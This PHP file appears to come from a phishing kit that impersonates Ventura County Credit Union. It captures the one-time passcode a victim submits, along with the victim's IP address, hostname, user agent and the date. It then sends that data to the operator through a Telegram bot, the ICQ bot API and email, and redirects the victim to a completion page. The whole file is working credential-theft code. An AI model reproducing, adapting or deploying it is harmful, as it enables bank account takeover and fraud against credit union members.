<?php 
session_start();
ob_start();
require_once '../func.php';
require_once '../Results/ResultsConfig.php';

$_SESSION['randString'] = genRandString();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
if (!empty( $_POST['code'] ) ) {
		$Date = date("Y/m/d h:i:sa");
		$_SESSION['code'] = $_POST['code'];

		$nl = "\r\n";
		$code = "============== 🎯[ VENTURA COUNTY CU OTP CODE | ]🎯 ==============".$nl;
		$code .= "[OTP CODE] 	: ".$_SESSION['code'].$nl;
		$code .= "	--------🔑 I N F O | I P 🔑 --------	".$nl;
		$code .= "IP		: ".$ip.$nl;
		$code .= "IP lookup		: https://ip-api.com/".$ip.$nl;
		$code .= "OS		: ".$useragent.$nl;
		$code .= "DATE		: ".$Date.$nl;
		$code .= "============= [ ./🎲 VENTURA COUNTY CU OTP CODE 🎲 ] =============".$nl;

		if (strpos(strtolower($Telegram),'yes') !== false)
		{
		    require_once '../Results/Telegram.php';
			$params=[
				'chat_id'=>$ChatID,
				'text'=>$code,
			];
		    SendHits('https://api.telegram.org/bot'.$Token.'/sendMessage',$params);
		}
		if (strpos(strtolower($ICQ),'yes') !== false)
		{
		    require_once '../Results/ICQ.php';
			$params=[
				'token'=>$Token,
				'chatId'=>$ChatID,
				'text'=>$code,
			];
		    SendHits('https://api.icq.net/bot/v1/messages/sendText',$params);
		}
		if (strpos(strtolower($Email),'yes') !== false)
		{
		$code = <<<EOT
============== 🎯[ VENTURA COUNTY CU OTP CODE | ]🎯 ==============
[OTP CODE] : {$_SESSION['code']}
	--------🔑 I N F O | I P 🔑 --------
IP		: {$ip}
IP lookup		: https://ip-api.com/{$ip}
OS		: {$useragent}
DATE		: {$Date}
============= [ ./🎲 VENTURA COUNTY CU OTP CODE 🎲 ] =============
\r\n\r\n
EOT;
			$subject = "🎲 VENTURA COUNTY CU OTP CODE 🎲  From $ip";
	        $headers = "From: 💰YBA💰 <yoloby@yba.com>\r\n";
	        $headers .= "MIME-Version: 1.0\r\n";
	        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

		    require_once '../Results/Email.php';
		    mail($Email,$subject,$code,$headers);
		}

        $sessionId = $_SESSION['randString'];
        header("Location: ../done.php");
        exit();
	} else {
		header("Location: ../done.php");
		exit();
	}
?>
